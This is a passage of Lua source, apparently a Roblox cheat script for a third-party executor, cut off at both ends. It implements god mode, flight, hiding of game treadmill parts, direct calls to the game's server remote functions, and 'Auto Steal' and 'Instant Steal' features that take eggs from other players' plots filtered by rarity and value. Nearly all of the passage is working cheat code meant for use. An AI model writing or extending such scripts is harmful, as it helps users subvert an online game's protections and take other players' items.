					task.spawn(function()
						character:WaitForChild("Humanoid", 10)
						task.wait(1)

						if connection and localPlayer.Character == character then
							func36()
						end
					end)
				end)
			end

			str1.Swapped = function()
				if first1 ~= shieldMethods[1] then
					return true
				end
				local character = localPlayer.Character
				return tbl24.Clone ~= nil and character ~= nil and tbl24.Clone.Parent == character
			end

			str1.Shield = function(param19, flag17)
				tbl22[param19] = flag17 == true or nil
				if next(tbl22) == nil then
					func35()
					return
				end

				if connection then
					return
				end
				func37()
			end

			str1.SetShieldMethod = function(flag18)
				if not table.find(shieldMethods, flag18) or flag18 == first1 then
					return
				end
				local flag19 = connection ~= nil
				func35()
				first1 = flag18

				if flag19 and next(tbl22) ~= nil then
					func37()
				end
			end

			func4(func35)
		end

		str1.Shield("load", true)

		str1.Toggle = function(obj, flag20)
			if type(obj) ~= "table" then
				return flag20 == true
			end

			local ok, result = pcall(function()
				local controller = obj._controller
				return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
			end)

			if ok and type(result) == "boolean" then
				return result
			end

			for _, item12 in ipairs({ "Get", "GetValue" }) do
				local ok2, result2 = pcall(function()
					return obj[item12]
				end)

				if ok2 and type(result2) == "function" then
					local ok3, result3 = pcall(result2, obj)
					if ok3 and type(result3) == "boolean" then
						return result3
					end
				end
			end

			return flag20 == true
		end

		str1.Root = function()
			local character = localPlayer.Character
			character = character and character:FindFirstChild("HumanoidRootPart")
			return character and character:IsDescendantOf(workspace) and character or nil
		end

		str1.PlacedPoints = function()
			local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
			local tbl28 = {}
			if not placedEggRenders then
				return tbl28
			end
			local userId2 = tostring(localPlayer.UserId)

			for _, child in ipairs(placedEggRenders:GetChildren()) do
				if string.find(child.Name, userId2, 1, true) then
					local ok, result = pcall(function()
						return child:IsA("Model") and child:GetPivot() or child.CFrame
					end)

					if ok then
						table.insert(tbl28, result.Position)
					end
				end
			end

			return tbl28
		end

		str1.OwnPlot = function()
			local plots = workspace:FindFirstChild("Plots")
			if not plots then
				return nil
			end

			for _, child in ipairs(plots:GetChildren()) do
				local plotSign = child:FindFirstChild("PlotSign")
				plotSign = plotSign and plotSign:FindFirstChild("PlayerPlotSign")
				plotSign = plotSign and plotSign:FindFirstChild("Frame")
				plotSign = plotSign and plotSign:FindFirstChild("PlayerName")

				if plotSign and plotSign:IsA("TextLabel") then
					local lowered2 = string.lower(plotSign.Text)
					if lowered2 == string.lower(localPlayer.Name) or lowered2 == string.lower(localPlayer.DisplayName) then
						return child
					end
				end
			end

			return nil
		end

		local function func38()
			local list7 = str1.PlacedPoints()
			if #list7 == 0 then
				return nil
			end
			local vector = Vector3.zero

			for _, item13 in ipairs(list7) do
				vector += item13
			end

			return vector / #list7
		end

		str1.PenAnchor = function()
			local result7 = func38()
			if result7 then
				return result7
			end
			local obj16 = str1.OwnPlot()
			if not obj16 then
				return nil
			end
			local toUpdate = obj16:FindFirstChild("ToUpdate")
			local starterPen = toUpdate and toUpdate:FindFirstChild("StarterPen") or obj16:FindFirstChild("CenterPoint")
			if not starterPen then
				return nil
			end

			local ok, result = pcall(function()
				return starterPen:IsA("Model") and starterPen:GetPivot() or starterPen.CFrame
			end)

			return ok and result.Position or nil
		end

		str1.Plot = function()
			local value20 = str1.OwnPlot()
			if value20 then
				return value20
			end
			local plots = workspace:FindFirstChild("Plots")
			local result8 = func38()
			if not plots or not result8 then
				return nil
			end
			local huge = math.huge
			local value21 = nil

			for _, child in ipairs(plots:GetChildren()) do
				local ok, result, result2 = pcall(function()
					return child:GetBoundingBox()
				end)

				if ok and result and result2 then
					local value22 = result:PointToObjectSpace(result8)
					local n5 = result2.X / 2
					local flag21 = math.abs(value22.X) <= n5
					local flag22

					if flag21 then
						local n6 = result2.Z / 2
						flag22 = math.abs(value22.Z) <= n6
					else
						flag22 = flag21
					end

					if flag22 then
						return child
					end
					local magnitude = (result.Position - result8).Magnitude

					if magnitude < huge then
						value21 = child
						huge = magnitude
					end
				end
			end

			if value21 and huge <= 60 then
				return value21
			end
			return nil
		end

		str1.Belt = function()
			local obj17 = str1.Plot()
			if not obj17 then
				return nil
			end
			local treadmillBottom = obj17:FindFirstChild("TreadmillBottom")
			if treadmillBottom and treadmillBottom:IsA("BasePart") then
				return treadmillBottom
			end
			local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
			clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. obj17.Name)

			if clientTreadmillRenders then
				clientTreadmillRenders = clientTreadmillRenders:FindFirstChild("BoundingBoxPart") or clientTreadmillRenders:IsA("Model") and clientTreadmillRenders.PrimaryPart or clientTreadmillRenders:FindFirstChildWhichIsA("BasePart")
			end

			if clientTreadmillRenders then
				return clientTreadmillRenders
			end
			local treadmillUpgrade = obj17:FindFirstChild("TreadmillUpgrade")
			return treadmillUpgrade and treadmillUpgrade:FindFirstChildWhichIsA("BasePart") or nil
		end

		str1.DistanceTo = function(num6)
			local flag23 = str1.Root()
			if not flag23 or not num6 then
				return math.huge
			end
			return (flag23.Position - num6).Magnitude
		end

		do
			local tbl29 = {}
			local n5 = 0

			local function func39()
				local obj18 = str1.Plot()
				if not obj18 then
					return {}
				end
				local tbl30 = {}

				for _, item14 in ipairs({ "TreadmillBottom", "TreadmillUpgrade" }) do
					local obj19 = obj18:FindFirstChild(item14)

					if obj19 then
						if obj19:IsA("BasePart") then
							table.insert(tbl30, obj19)
						else
							for _, descendant in ipairs(obj19:GetDescendants()) do
								if descendant:IsA("BasePart") then
									table.insert(tbl30, descendant)
								end
							end
						end
					end
				end

				local clientTreadmillRenders = workspace:FindFirstChild("__ClientTreadmillRenders")
				clientTreadmillRenders = clientTreadmillRenders and clientTreadmillRenders:FindFirstChild("TreadmillRender_" .. obj18.Name)

				if clientTreadmillRenders then
					for _, descendant in ipairs(clientTreadmillRenders:GetDescendants()) do
						if descendant:IsA("BasePart") then
							table.insert(tbl30, descendant)
						end
					end
				end

				return tbl30
			end

			local function func40()
				for _, item15 in ipairs(func39()) do
					if not tbl29[item15] then
						tbl29[item15] = {
							CFrame = item15.CFrame,
							CanTouch = item15.CanTouch,
							CanCollide = item15.CanCollide,
							Transparency = item15.Transparency,
						}

						pcall(function()
							item15.CanTouch = false
							item15.CanCollide = false
							item15.Transparency = 1
							item15.CFrame = item15.CFrame - Vector3.new(0, 120, 0)
						end)
					end
				end
			end

			local function func41()
				for k, value23 in pairs(tbl29) do
					if k and k.Parent then
						pcall(function()
							k.CFrame = value23.CFrame
							k.CanTouch = value23.CanTouch
							k.CanCollide = value23.CanCollide
							k.Transparency = value23.Transparency
						end)
					end
				end

				table.clear(tbl29)
			end

			str1.HoldBelt = function()
				n5 += 1
				func40()
			end

			str1.ReleaseBelt = function()
				n5 = math.max(0, n5 - 1)

				if n5 == 0 then
					func41()
				end
			end

			str1.BeltHeld = function()
				return n5 > 0
			end

			str1.RefreshBeltHide = function()
				if n5 > 0 then
					func40()
				end
			end

			func4(function()
				n5 = 0
				func41()
			end)

			str1.LeaveBelt = function()
				local rfTreadmillAskDoff = networking:FindFirstChild("RF/Treadmill/AskDoff")

				if rfTreadmillAskDoff and rfTreadmillAskDoff:IsA("RemoteFunction") then
					pcall(rfTreadmillAskDoff.InvokeServer, rfTreadmillAskDoff)
				end
			end

			str1.Treadmill = { Riding = false }

			str1.ResetBelt = function()
				n5 = 0
				func41()
			end

			str1.OnBelt = function()
				local flag24 = str1.Belt()
				if not flag24 or tbl29[flag24] then
					return false
				end
				local flag25 = str1.Root()
				if not flag25 then
					return false
				end
				local value24 = flag24.CFrame:PointToObjectSpace(flag25.Position)
				local n6 = flag24.Size.X / 2 + 2
				local flag26 = math.abs(value24.X) <= n6
				local flag27

				if flag26 then
					local n7 = flag24.Size.Z / 2 + 2
					flag27 = math.abs(value24.Z) <= n7
				else
					flag27 = flag26
				end

				return flag27 and value24.Y >= -2 and value24.Y <= flag24.Size.Y / 2 + 8
			end
		end

		str1.ExitBelt = function()
			str1.Treadmill.Riding = false
			str1.LeaveBelt()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				pcall(function()
					humanoid.Jump = true
					humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
				end)
			end

			task.wait(0.35)
		end

		str1.Flying = false
		str1.Driving = 0

		str1.BeginFlight = function()
			str1.Flying = true
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid then
				humanoid.PlatformStand = true

				pcall(function()
					humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
				end)
			end

			return str1.Root() ~= nil
		end

		str1.SetFlightVelocity = function(assemblyLinearVelocity)
			local value25 = str1.Root()

			if value25 then
				value25.AssemblyLinearVelocity = assemblyLinearVelocity
				value25.AssemblyAngularVelocity = Vector3.zero
			end
		end

		str1.EndFlight = function()
			str1.Flying = false
			local value26 = str1.Root()

			if value26 then
				pcall(function()
					value26.AssemblyLinearVelocity = Vector3.zero
					value26.AssemblyAngularVelocity = Vector3.zero
				end)
			end

			local character = localPlayer.Character
			character = character and character:FindFirstChildOfClass("Humanoid")

			if character then
				character.PlatformStand = false
			end
		end

		do
			local tbl31 = {
				Enum.HumanoidStateType.FallingDown,
				Enum.HumanoidStateType.Ragdoll,
				Enum.HumanoidStateType.Physics,
				Enum.HumanoidStateType.Seated,
				Enum.HumanoidStateType.PlatformStanding,
			}

			local tbl32 = {}
			local flag28 = false

			str1.GodMode = function(param20)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not character or not humanoid then
					return
				end

				if param20 then
					flag28 = true

					for _, item16 in ipairs(tbl31) do
						pcall(function()
							humanoid:SetStateEnabled(item16, false)
						end)
					end

					pcall(function()
						humanoid.BreakJointsOnDeath = false
					end)

					for _, descendant in ipairs(character:GetDescendants()) do
						if descendant:IsA("BasePart") and tbl32[descendant] == nil then
							tbl32[descendant] = descendant.CanCollide

							pcall(function()
								descendant.CanCollide = false
							end)
						end
					end
				elseif flag28 then
					flag28 = false

					for _, item17 in ipairs(tbl31) do
						pcall(function()
							humanoid:SetStateEnabled(item17, true)
						end)
					end

					for k, value27 in pairs(tbl32) do
						if k and k.Parent then
							pcall(function()
								k.CanCollide = value27
							end)
						end
					end

					table.clear(tbl32)
				end
			end
		end

		str1.GodTick = function()
			local character = localPlayer.Character
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.Health < humanoid.MaxHealth then
				pcall(function()
					humanoid.Health = humanoid.MaxHealth
				end)
			end
		end

		str1.StopWalking = function()
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoidRootPart then
				pcall(function()
					humanoid:MoveTo(humanoidRootPart.Position)
					humanoid:Move(Vector3.zero, false)
				end)
			end
		end

		local function func42(num7, param21, param22, callback2)
			local n5 = tonumber(param21) or 6
			local n6 = tonumber(param22) or 10
			local n7 = 0
			local value28 = nil
			local n8 = 0
			local n9 = 0

			while n7 < n6 do
				if type(callback2) == "function" and callback2() then
					str1.StopWalking()
					return false
				end
				local character = localPlayer.Character
				local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
				character = character and character:FindFirstChildOfClass("Humanoid")
				if not humanoidRootPart or not character or character.Health <= 0 then
					return false
				end

				if (humanoidRootPart.Position - num7).Magnitude <= n5 then
					str1.StopWalking()
					return true
				end
				value28 = value28 and (humanoidRootPart.Position - value28).Magnitude < 1

				if value28 then
					n8 += 0.2
				else
					n8 = 0
				end

				value28 = humanoidRootPart.Position
				n9 = math.max(0, n9 - 0.2)

				if n8 >= 0.8 and n9 <= 0 then
					str1.LeaveBelt()

					pcall(function()
						character.Jump = true
					end)

					n8 = 0
					n9 = 1.5
				end

				character:MoveTo(num7)
				n7 += task.wait(0.2)
			end

			str1.StopWalking()
			return str1.DistanceTo(num7) <= n5
		end

		str1.WalkTo = function(param23, param24, param25, param26)
			str1.Driving = str1.Driving + 1
			local ok, result = pcall(func42, param23, param24, param25, param26)
			str1.Driving = math.max(0, str1.Driving - 1)
			return ok and result == true
		end

		local tbl33 = {
			Boss = "Fractured",
			GreatBloom = "Spirit Bloom",
			Sakura = "Bloom",
			Monstrous = "Parasite",
		}

		task.spawn(function()
			local mutations = tbl1.Mutations

			local ok, result = pcall(function()
				return mutations.All()
			end)

			if ok and type(result) == "table" then
				for k, value29 in pairs(result) do
					local id = type(value29) == "table" and (value29.Id or k) or nil
					local label = type(value29) == "table" and value29.Label or nil

					if id ~= nil and type(label) == "string" and label ~= "" then
						tbl33[tostring(id)] = label
					end
				end
			end
		end)

		func7 = function(param27)
			return tbl33[tostring(param27)] or tostring(param27)
		end

		local tbl34

		tbl34 = {
			"Forest",
			"Desert",
			"Snow",
			"Lake",
			"Jungle",
			"Volcano",
			"Prehistoric",
			"Cosmic",
			"Abyss Ocean",
			"Cherry Blossom",
			"Light Dark",
			"Titan Temple",
		}

		local tbl35 = {}

		for _, item18 in ipairs(tbl34) do
			tbl35[item18] = true
		end

		task.spawn(function()
			local eggState = tbl1.EggState

			local ok, result = pcall(function()
				return eggState.ReadFieldEggs()
			end)

			if ok and type(result) == "table" and type(result.Records) == "table" then
				for _, record in pairs(result.Records) do
					local areaId = type(record) == "table" and record.AreaId or nil

					if type(areaId) == "string" and not tbl35[areaId] then
						tbl35[areaId] = true
						table.insert(tbl34, areaId)
					end
				end
			end
		end)

		list3 = { "Any" }
		tbl8 = { Any = 0 }

		do
			local tbl36 = {}
			local directory = tbl1.Assets and tbl1.Assets.Directory

			if type(directory) == "table" then
				for _, value30 in pairs(directory) do
					local rarity = type(value30) == "table" and value30.Rarity or nil
					local flag29 = type(rarity) == "table"
					local flag30

					if flag29 then
						flag30 = tonumber(rarity.RarityNumber or rarity.Rank)
					else
						flag30 = flag29
					end

					flag30 = flag30 or nil

					if flag30 then
						local entry2 = tbl36[flag30]

						if not entry2 then
							entry2 = tostring(rarity.DisplayName or rarity._id or flag30)
						end

						tbl36[flag30] = entry2
					end
				end
			end

			if next(tbl36) == nil then
				tbl36 = {
					"Common",
					"Uncommon",
					"Rare",
					"Epic",
					"Legendary",
					"Mythic",
					"Cosmic",
					"Secret",
					"Eternal",
					"Divine",
				}
			end

			local tbl37 = {}

			for k in pairs(tbl36) do
				table.insert(tbl37, k)
			end

			table.sort(tbl37)

			for _, item19 in ipairs(tbl37) do
				table.insert(list3, tbl36[item19])
				tbl8[tbl36[item19]] = item19
			end
		end

		list2 = { "Best Rarity", "Biggest Weight", "Best Mutation", "Highest Value", "Lowest Value" }
		local tbl38
		tbl38 = {}
		local n5
		n5 = 0
		local tbl39
		tbl39 = {}
		local tbl40
		tbl40 = {}
		local tbl41
		tbl41 = {}
		local tbl42
		tbl42 = {}
		str1.Steal.RiftPriority = false
		str1.Steal.RiftNeeds = {}
		str1.Steal.RiftRequirements = {}
		str1.Steal.RiftCurrent = {}

		str1.StockWaits = function(obj)
			if type(obj) ~= "table" or not obj.RiftOnly or obj.RiftNow then
				return false
			end
			local mech = str1.Mech
			if type(mech) ~= "table" or str1.Toggle(mech.Handle, false) ~= true then
				return false
			end
			return mech.Busy == true or workspace:FindFirstChild("ScrambleArenaPortal") ~= nil or localPlayer:GetAttribute("InScrambleArena") == true
		end

		str1.Lab = {
			Banners = {},
			Reserved = {},
			SkipOwned = true,
			Stock = {},
			StockEggs = {},
			StockPer = 3,
			Pools = {},
			PoolLists = {},
		}

		str1.Lab.Shares = {
			Biohazard = {
				{ "Cyclops Gorilla", 0.431 },
				{ "Red Panda", 0.431 },
				{ "Snowy Owl", 0.399 },
				{ "Salamander", 0.381 },
				{ "Pterodactyl", 0.234 },
				{ "Galaxy Gecko", 0.202 },
				{ "Ankylosaurus", 0.194 },
				{ "Crane", 0.138 },
				{ "Parrotfish", 0.126 },
				{ "Centapede", 0.106 },
				{ "Dodo", 0.104 },
				{ "Swordfish", 0.1 },
				{ "Koi", 0.046 },
				{ "La Vacca Saturno Saturnita", 0.044 },
				{ "Finned Thresher", 0.024 },
				{ "Bronto", 0.019 },
				{ "Triceratops", 0.013 },
				{ "Orca", 0.009 },
			},
			Experimental = {
				{ "Blade Head", 0.342 },
				{ "Red Panda", 0.341 },
				{ "Crab", 0.331 },
				{ "Salamander", 0.327 },
				{ "Snowy Owl", 0.324 },
				{ "Mantis", 0.314 },
				{ "Cyclops Gorilla", 0.178 },
				{ "Galaxy Gecko", 0.161 },
				{ "Crane", 0.135 },
				{ "Kaiju Spider", 0.134 },
				{ "Pterodactyl", 0.119 },
				{ "Dodo", 0.096 },
				{ "Centapede", 0.094 },
				{ "Rhino", 0.034 },
				{ "Koi", 0.032 },
				{ "Ankylosaurus", 0.03 },
				{ "La Vacca Saturno Saturnita", 0.01 },
				{ "Bronto", 0.001 },
				{ "Triceratops", 0.001 },
			},
			UnstableDNA = {
				{ "Toro", 0.236 },
				{ "Lamb", 0.232 },
				{ "Blade Head", 0.228 },
				{ "Imp", 0.223 },
				{ "Crab", 0.22 },
				{ "Moth", 0.219 },
				{ "Demon Hound", 0.217 },
				{ "Peacock", 0.21 },
				{ "Mantis", 0.203 },
				{ "Salamander", 0.165 },
				{ "Dove", 0.104 },
				{ "Flame Sprite", 0.103 },
				{ "Galaxy Gecko", 0.103 },
				{ "Kaiju Spider", 0.102 },
				{ "Red Panda", 0.102 },
				{ "Crane", 0.096 },
				{ "Snowy Owl", 0.088 },
				{ "Centapede", 0.064 },
				{ "Cyclops Gorilla", 0.021 },
				{ "Jellyfish", 0.02 },
				{ "Dark Gargoyle", 0.019 },
				{ "Rhino", 0.018 },
				{ "Koi", 0.009 },
				{ "La Vacca Saturno Saturnita", 0.001 },
			},
		}

		str1.Lab.Pickers = {}
		str1.Lab.ExtraPath = "ChilliLibrary/SAE_LabEggs.json"

		str1.Lab.RefreshPools = function()
			local lab = str1.Lab

			local ok, result = pcall(function()
				return require(ReplicatedStorage.Shared.Modules.ScrambleTradeInRecipes)
			end)

			if not ok or type(result) ~= "table" or type(result.Simulate) ~= "function" then
				return
			end
			local HttpService = game:GetService("HttpService")
			local tbl43 = {}

			pcall(function()
				if isfile(lab.ExtraPath) then
					local data = HttpService:JSONDecode(readfile(lab.ExtraPath))

					if type(data) == "table" then
						tbl43 = data
					end
				end
			end)

			local flag31 = false

			for k, share in pairs(lab.Shares) do
				local ok2, result2 = pcall(result.Simulate, k, 4000)

				if ok2 and type(result2) == "table" and type(result2.SlotPicks) == "table" then
					local n6 = math.max(1, tonumber(result2.Runs) or 4000)
					local tbl44 = {}

					for _, slotPick in pairs(result2.SlotPicks) do
						if type(slotPick) == "table" then
							for k2, value31 in pairs(slotPick) do
								local str4 = tostring(k2)
								tbl44[str4] = (tbl44[str4] or 0) + (tonumber(value31) or 0)
							end
						end
					end

					local tbl45 = type(tbl43[k]) == "table" and tbl43[k] or {}
					local tbl46 = {}
					local tbl47 = {}
					local flag32 = false

					for _, item20 in ipairs(share) do
						local first2 = item20[1]
						local second1 = item20[2]

						if (tbl44[first2] or 0) > 0 or second1 < 0.02 then
							tbl46[first2] = true
							table.insert(tbl47, { first2, second1 })
						else
							flag32 = true
						end
					end

					for k2, value32 in pairs(tbl44) do
						if not tbl46[k2] and value32 > 0 then
							local num8 = tonumber(tbl45[k2])

							if not num8 then
								num8 = math.max(0.001, math.floor(value32 / n6 * 1000 + 0.5) / 1000)
								tbl45[k2] = num8
								tbl43[k] = tbl45
								flag31 = true
							end

							table.insert(tbl47, { k2, num8 })
							flag32 = true
						end
					end

					if flag32 then
						table.sort(tbl47, function(tbl48, tbl49)
							if tbl48[2] ~= tbl49[2] then
								return tbl48[2] > tbl49[2]
							end
							return tbl48[1] < tbl49[1]
						end)

						lab.Shares[k] = tbl47
						lab.Pools[k] = nil
						lab.PoolLists[k] = nil
						local flag33 = lab.Pickers[k]

						if flag33 and flag33.Handle and type(flag33.Handle.SetOptions) == "function" and type(lab.LabelsFor) == "function" then
							local list8, value33 = lab.LabelsFor(k)

							if #list8 > 0 then
								flag33.CategoryOf = value33
								pcall(flag33.Handle.SetOptions, flag33.Handle, list8, nil, true)
							end
						end
					end
				end

				task.wait()
			end

			task.delay(0.3, function()
				pcall(str1.Lab.FixPickers)
			end)

			if flag31 and type(writefile) == "function" then
				pcall(function()
					if type(isfolder) == "function" and type(makefolder) == "function" and not isfolder("ChilliLibrary") then
						makefolder("ChilliLibrary")
					end

					writefile(lab.ExtraPath, HttpService:JSONEncode(tbl43))
				end)
			end
		end

		str1.Lab.FixPickers = function()
			local lab = str1.Lab
			if not str1.Steal.RiftPriority or type(lab.LabelsFor) ~= "function" then
				return
			end

			for k, picker in pairs(lab.Pickers) do
				local handle = picker.Handle
				local value34 = type(handle) == "table" and rawget(handle, "Instance") or nil

				if typeof(value34) == "Instance" and value34.AbsoluteSize.Y <= 2 and type(handle.SetOptions) == "function" then
					local list9, value35 = lab.LabelsFor(k)

					if #list9 > 0 then
						picker.CategoryOf = value35
						pcall(handle.SetOptions, handle, list9, nil, false)
					end
				end
			end
		end

		str1.Lab.PoolOf = function(param28)
			local lab = str1.Lab
			local value36 = lab.Pools[param28]
			if value36 then
				return value36
			end
			local tbl50 = {}
			local tbl51 = {}
			local func43 = ipairs
			local tbl52 = lab.Shares[tostring(param28)] or {}

			for _, value37 in func43(tbl52) do
				local first3 = value37[1]
				local second2 = value37[2]

				if second2 >= 0.05 then
					tbl50[first3] = true
				end

				table.insert(tbl51, { Category = first3, Share = second2 })
			end

			lab.Pools[param28] = tbl50
			lab.PoolLists[param28] = tbl51
			return tbl50
		end

		str1.Lab.IsLabPet = function(param29)
			local lab = str1.Lab

			if not lab.PetSet then
				local petSet = {}
				local data = lab.Data

				if type(data) == "table" and type(data.Banners) == "table" then
					for _, banner in ipairs(data.Banners) do
						local func44 = ipairs
						local pets = type(banner) == "table" and type(banner.Pets) == "table" and banner.Pets or {}

						for _, pet in func44(pets) do
							if type(pet) == "table" and pet.AssetId ~= nil then
								petSet[tostring(pet.AssetId)] = true
							end
						end
					end
				end

				if next(petSet) == nil then
					return false
				end
				lab.PetSet = petSet
			end

			return lab.PetSet[tostring(param29)] == true
		end

		str1.Lab.StockActive = function()
			return next(str1.Lab.Stock) ~= nil
		end

		str1.Lab.StockTargets = function()
			local lab = str1.Lab
			local tbl53 = {}
			if not str1.Steal.RiftPriority or not lab.StockActive() then
				return tbl53
			end

			for k in pairs(lab.Stock) do
				local flag34 = lab.StockEggs[k]
				local func45 = pairs
				flag34 = type(flag34) == "table" and flag34 or {}

				for k2 in func45(flag34) do
					tbl53[k2] = lab.StockPer
				end
			end

			return tbl53
		end

		str1.Lab.Data = func2(function()
			return ReplicatedStorage.Data.ScrambleTradeIn
		end)

		str1.Lab.Fallback = {
			{ Id = "Biohazard", Name = "Biohazard Pets" },
			{ Id = "Experimental", Name = "Experimental Pets" },
			{ Id = "UnstableDNA", Name = "Unstable DNA" },
		}

		str1.Lab.BannerList = function()
			local data = str1.Lab.Data
			local tbl54 = {}

			if type(data) == "table" and type(data.Banners) == "table" then
				for _, banner in ipairs(data.Banners) do
					if type(banner) == "table" and banner.Id ~= nil then
						table.insert(tbl54, { Id = tostring(banner.Id), Name = tostring(banner.DisplayName or banner.Id) })
					end
				end
			end

			if #tbl54 == 0 then
				return str1.Lab.Fallback
			end
			return tbl54
		end

		str1.Lab.BannerName = function(param30)
			for _, item21 in ipairs(str1.Lab.BannerList()) do
				if item21.Id == tostring(param30) then
					return item21.Name
				end
			end

			return tostring(param30)
		end

		str1.Lab.BannerOk = function(flag35)
			if next(str1.Lab.Banners) == nil then
				return true
			end
			return flag35 ~= nil and str1.Lab.Banners[tostring(flag35)] == true
		end

		str1.Lab.PickedText = function()
			local tbl55 = {}

			for _, item22 in ipairs(str1.Lab.BannerList()) do
				if str1.Lab.Banners[item22.Id] then
					table.insert(tbl55, item22.Name)
				end
			end

			return table.concat(tbl55, " or ")
		end

		local flag36
		flag36 = false
		local tbl56
		tbl56 = {}
		local n6
		n6 = 0
		flag1 = list2[4]
		local n7
		n7 = 27.4
		local n8
		n8 = 400
		local func46
		func46 = nil

		value2 = obj9:CreateToggle({
			Name = "Auto Steal",
			Default = false,
			Callback = function()
				if func46 then
					func46()
				end
			end,
		})

		str1.SafeCarry.InstantHandle = obj9:CreateToggle({
			Name = "Instant Steal",
			Note = "Delivers the egg to the safe zone in a few seconds, needs enough Speed",
			Default = false,
			Callback = function(value)
				if type(value) ~= "boolean" then
					value = str1.Toggle(str1.SafeCarry.InstantHandle, false)
				end

				str1.SafeCarry.LineDrop = value ~= false
				str1.SafeCarry.SpeedJitter = str1.SafeCarry.LineDrop and 0 or 0.08

				if str1.StealPanelSync then
					pcall(str1.StealPanelSync)
				end
			end,
		})

		obj9:CreateSlider({
			Name = "Instant Steal Steps",
			Note = "Higher is safer but takes longer",
			Min = 1,
			Max = 6,
			Default = 3,
			Increment = 1,
			Callback = function(value)
				local n9 = math.clamp(math.floor(tonumber(value) or 3), 1, 6)
				local midDrops = {}

				for i = 1, n9 - 1 do
					table.insert(midDrops, i / n9)
				end

				str1.SafeCarry.MidDrops = midDrops
			end,
		})

		for _, item23 in ipairs(tbl34) do
			tbl38[item23] = true
		end

		func6(obj9:CreateMultiDropdown({
			Name = "Target Areas",
			Options = tbl34,
			Default = tbl34,
			Callback = function(value)
				local tbl57 = {}

				if type(value) == "table" then
					for k, value38 in pairs(value) do
						if value38 == true and type(k) == "string" then
							tbl57[k] = true
						elseif type(value38) == "string" then
							tbl57[value38] = true
						end
					end
				end

				if next(tbl57) == nil then
					for _, item24 in ipairs(tbl34) do
						tbl57[item24] = true
					end
				end

				tbl38 = tbl57
			end,
		}))

		obj9:CreateDropdown({
			Name = "Min Rarity",
			Note = "Steal eggs of the chosen rarity and every rarity above it",
			Options = list3,
			Default = list3[1],
			Callback = function(value)
				n5 = tbl8[value] or 0
			end,
		})

		func5(obj9, {
			Name = "Min Steal Value",
			Note = "Skip eggs worth less than this. Drag or type 250k, 50m, 1.5b",
			Legacy = "Min Value To Steal",
			SectionName = "Auto Steal",
			OnRaw = function(param31)
				n6 = param31
			end,
		})

		do
			local tbl58 = {}
			local tbl59 = {}
			local directory = tbl1.Assets and tbl1.Assets.Directory
			local tbl60 = {}

			if type(directory) == "table" then
				for k, value39 in pairs(directory) do
					local rarity = type(value39) == "table" and value39.Rarity or nil
					local flag37 = type(rarity) == "table"

					if flag37 then
						flag37 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					flag37 = flag37 or nil

					if flag37 then
						table.insert(tbl60, {
							Category = tostring(k),
							Name = tostring(value39.DisplayName or k),
							Rarity = flag37,
							RarityName = tostring(rarity.DisplayName or rarity._id or flag37),
						})
					end
				end
			end

			table.sort(tbl60, function(param32, param33)
				if param32.Rarity ~= param33.Rarity then
					return param32.Rarity > param33.Rarity
				end
				return param32.Name < param33.Name
			end)

			for _, item25 in ipairs(tbl60) do
				local formatted = string.format("%s [%s]", item25.Name, item25.RarityName)

				if tbl59[formatted] then
					formatted = string.format("%s [%s] (%s)", item25.Name, item25.RarityName, item25.Category)
				end

				table.insert(tbl58, formatted)
				tbl59[formatted] = item25.Category
			end

			func6(obj9:CreateMultiDropdown({
				Name = "Target Specific Eggs",
				Note = "Only steal these eggs (empty = all)",
				Options = tbl58,
				Default = {},
				Callback = function(value)
					local tbl61 = {}

					if type(value) == "table" then
						for k, value40 in pairs(value) do
							k = value40 == true and type(k) == "string" and k or type(value40) == "string" and value40 or nil

							if k and tbl59[k] then
								tbl61[tbl59[k]] = true
							end
						end
					end

					tbl39 = tbl61
				end,
			}))
		end

		do
			local n9 = 30
			local value41 = nil
			local flag38 = false
			local n10 = 0

			local function func47()
				local tbl62 = {}
				local save2 = tbl1.Save

				if type(save2) == "table" and type(save2.Get) == "function" then
					local ok, result = pcall(save2.Get)

					if ok and type(result) == "table" then
						local tbl63 = {}
						local eggState = tbl1.EggState

						if type(eggState) == "table" and type(eggState.ReadOwnerEggs) == "function" then
							local ok2, result2 = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)

							if ok2 and type(result2) == "table" then
								for k, value42 in pairs(result2) do
									if type(value42) == "table" and value42.Placement ~= nil then
										tbl63[k] = true
									end
								end
							end
						end

						local func48 = pairs
						local eggInventory = result.EggInventory or {}

						for k, value43 in func48(eggInventory) do
							if type(value43) == "table" and value43.AssetCategory ~= nil and not tbl63[k] then
								local assetCategory = tostring(value43.AssetCategory)
								tbl62[assetCategory] = (tbl62[assetCategory] or 0) + 1
							end
						end
					end
				end

				return tbl62
			end

			local function func49()
				local lab = str1.Lab
				local tbl64 = {}
				str1.Steal.RiftCurrent = {}
				local value44 = nil

				if lab.StockActive() then
					value44 = func47()

					for k, stockTarget in pairs(lab.StockTargets()) do
						if (value44[k] or 0) < stockTarget then
							tbl64[k] = true
						end
					end

					local riftBanner = str1.Steal.RiftBanner
					if riftBanner == nil or not lab.Stock[riftBanner] then
						return tbl64
					end
				end

				local tbl65 = {}

				for _, riftRequirement in ipairs(str1.Steal.RiftRequirements) do
					tbl65[riftRequirement] = (tbl65[riftRequirement] or 0) + 1
				end

				if next(tbl65) == nil then
					return tbl64
				end

				if lab.SkipOwned then
					value44 = value44 or func47()
				else
					value44 = {}
				end

				local riftCurrent = {}

				for k, value45 in pairs(tbl65) do
					if (value44[k] or 0) < value45 then
						tbl64[k] = true
						riftCurrent[k] = true
					end
				end

				str1.Steal.RiftCurrent = riftCurrent
				return tbl64
			end

			local function func50()
				local rfScrambleTradeInAskState = networking:FindFirstChild("RF/ScrambleTradeIn/AskState")
